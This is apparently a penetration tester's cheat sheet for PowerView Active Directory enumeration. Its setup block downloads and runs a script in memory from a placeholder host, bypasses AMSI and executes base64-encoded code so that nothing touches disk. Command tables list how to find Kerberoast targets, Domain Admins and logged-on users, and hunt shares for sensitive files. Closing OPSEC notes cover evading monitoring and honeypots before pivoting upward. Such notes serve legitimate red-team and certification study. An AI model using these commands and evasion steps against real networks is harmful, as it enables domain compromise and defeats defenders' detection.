# PowerView — AD Enumeration

## Setup

```powershell
# Load into memory (avoids writing to disk)
iex (New-Object Net.WebClient).DownloadString('http://<ip>/PowerView.ps1')

# Or bypass AMSI first with InviShell
C:\> RunWithRegistryNonAdmin.bat
C:\> PowerView.ps1

# Or use BASE64 if url is restricted and avoid writing to disk
$Base64String = "<BASE64 ps1>"
$StandardText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Base64String))
if ($StandardText[0] -ne '#') { $StandardText = $StandardText.Substring(1) }
IEX $StandardText
```

---

## Full Command Reference

### Domain Information
| Command                | Purpose                            |
| ---------------------- | ---------------------------------- |
| `Get-Domain`           | Basic domain info (name, GUID, DC) |
| `Get-DomainController` | List all Domain Controllers        |
| `Get-DomainPolicy`     | Password policy, lockout settings  |
| `Get-DomainSID`        | Domain Security Identifier         |

### User Enumeration
| Command | Purpose |
|---|---|
| `Get-DomainUser` | All users + attributes |
| `Get-DomainUser -SPN` | Users with SPNs → Kerberoast targets |
| `Get-DomainUser \| select samaccountname` | Just usernames |
| `Get-DomainUser \| select samaccountname, logonCount` | Spot honeypot accounts (0 logons) |
| `Get-UserProperty -Properties pwdlastset` | When passwords were last changed |
| `Get-DomainUser -LDAPFilter "Description=*built*" \| Select name,Description` | Users with keywords in description |

### Group Enumeration
| Command | Purpose |
|---|---|
| `Get-DomainGroup` | All groups |
| `Get-DomainGroup *admin* \| select name` | Find admin groups |
| `Get-DomainGroupMember -Identity "Domain Admins"` | Who's in Domain Admins |
| `Get-DomainForeignGroupMember` | Users from outside domain in local groups |

### Computer Enumeration
| Command | Purpose |
|---|---|
| `Get-DomainComputer` | All computers + OS info |
| `Get-DomainComputer \| select dnshostname, logonCount` | Identify active machines |
| `Get-NetLoggedon -ComputerName <pc>` | Who's logged in right now |
| `Get-NetSession -ComputerName <pc>` | Active SMB sessions |

### ACLs & GPOs
| Command | Purpose |
|---|---|
| `Get-DomainObjectAcl -Identity <object>` | ACL for an object |
| `Get-DomainGPO` | All Group Policy Objects |
| `Get-DomainOU` | All Organizational Units |

### Trusts
| Command | Purpose |
|---|---|
| `Get-DomainTrust` | All domain trusts |
| `Get-Forest` | Forest info |
| `Get-ForestDomain` | All domains in forest |

---

## Native PowerShell (RSAT Alternative)

| PowerShell | PowerView Equivalent |
|---|---|
| `Get-ADDomain` | `Get-Domain` |
| `Get-ADUser -Filter *` | `Get-DomainUser` |
| `Get-ADComputer -Filter *` | `Get-DomainComputer` |
| `Get-ADGroup -Filter *` | `Get-DomainGroup` |
| `Get-ADGroupMember -Identity "Domain Admins"` | `Get-DomainGroupMember` |
| `Get-ADTrust -Filter *` | `Get-DomainTrust` |

---

## Share Enumeration

```powershell
# PowerHuntShares — finds shares, sensitive files, ACLs
Import-Module C:\path\PowerHuntShares.psm1
Invoke-HuntSMBShares -NoPing -OutputDirectory C:\output -HostList servers.txt

# Generate server list without DC (less noisy)
Get-DomainComputer -LDAPFilter "(&(objectClass=computer)(!(primaryGroupID=516)))" | Select-Object -ExpandProperty dnshostname | Out-File -FilePath servers.txt -Encoding ascii
```

---

## OPSEC Notes

- Stay away from targeting Domain Admins directly — they are the most monitored
- Focus on compromising local users first, then pivot up
- No logon count = possible honeypot — do not target
- Enterprise Admins group only shows in forest root domain (`-Domain <forest root>`)
